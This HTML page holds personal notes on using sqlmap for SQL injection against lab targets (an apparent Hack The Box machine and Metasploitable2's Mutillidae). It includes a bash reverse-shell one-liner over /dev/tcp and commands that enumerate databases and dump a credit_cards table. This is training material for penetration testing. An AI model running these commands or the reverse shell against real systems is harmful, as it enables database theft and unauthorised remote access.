<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Sqlmap</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Sqlmap</h1><br/>SQLmap is an open-source tool used in penetration testing to detect and exploit SQL<br />injection flaws. SQLmap automates the process of detecting and exploiting SQL<br />injection. SQL Injection attacks can take control of databases that utilize SQL.<br /><br />The sqlmap comes pre-installed with Parrot OS &amp; Kali Linux, however, you can install it through the<br />repository if you don&#39;t have it:<br /><br />sudo apt install sqlmap<br /><br /><a href=""><img src="images/35-1.png" alt="images/35-1.png" /></a><br /><br />We will provide the URL &amp; the cookie to the sqlmap in order for it to find vulnerability. The reason why we<br />have to provide a cookie is because of authentication:<br /><br /><br />To grab the cookie, we can intercept any request in Burp Suite &amp; get it from there,  OR  you can install a<br />great extension for your web browser called cookie-editor :<br /><br />The cookies in HTTP messages of requests are usually set the following way: [Found from cookie editor]<br /><br />PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1<br /><br />Knowing that, here&#39;s how our sqlmap syntax should look:<br /><br />sqlmap -u &#39;<a href="http://10.129.95.174/dashboard.php?search=any+query'">http://10.129.95.174/dashboard.php?search=any+query&#39;</a> --cookie=&quot;PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1&quot;<br /><br /><a href=""><img src="images/35-2.png" alt="images/35-2.png" /></a><br /><br />Note: We got the shell in sqlmap, however, it is not very stable &amp; interactive. To make it much stable, we will use the<br />following payload:<br />bash -c &quot;bash -i &gt;&amp; /dev/tcp/{your_IP}/443 0&gt;&amp;1&quot;<br /><br />This method is used to bring <strong>sqlmap</strong> shell into our netcat listener.<br /><br /><br /><br /><strong>Using Metaploitable2:::::</strong><br />Enumeration-Choose options wisely<br />sqlmap -u &quot;http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=123123&amp;user-info-php-submit-button=View+Account+Details&quot; <br /><br />To get all Databases:<br />sqlmap -u &quot;http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=123123&amp;user-info-php-submit-button=View+Account+Details&quot; --dbs<br /><br />To get all Tables of a Database(owasp10):<br /> sqlmap -u &quot;http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=123123&amp;user-info-php-submit-button=View+Account+Details&quot; --tables -D oswasp10<br /> <br /> To get all columns of a table (credit_cards) from database (owasp10):<br /> sqlmap -u &quot;http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=123123&amp;user-info-php-submit-button=View+Account+Details&quot; --columns -T credit_cards -D owasp10<br /> <br /> To dump all data of a table:<br /> sqlmap -u &quot;http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=123123&amp;user-info-php-submit-button=View+Account+Details&quot; -T credit_cards -D owasp10 --dump<br /> <br /> <br /><br /><br /></div>
</body>
</html>
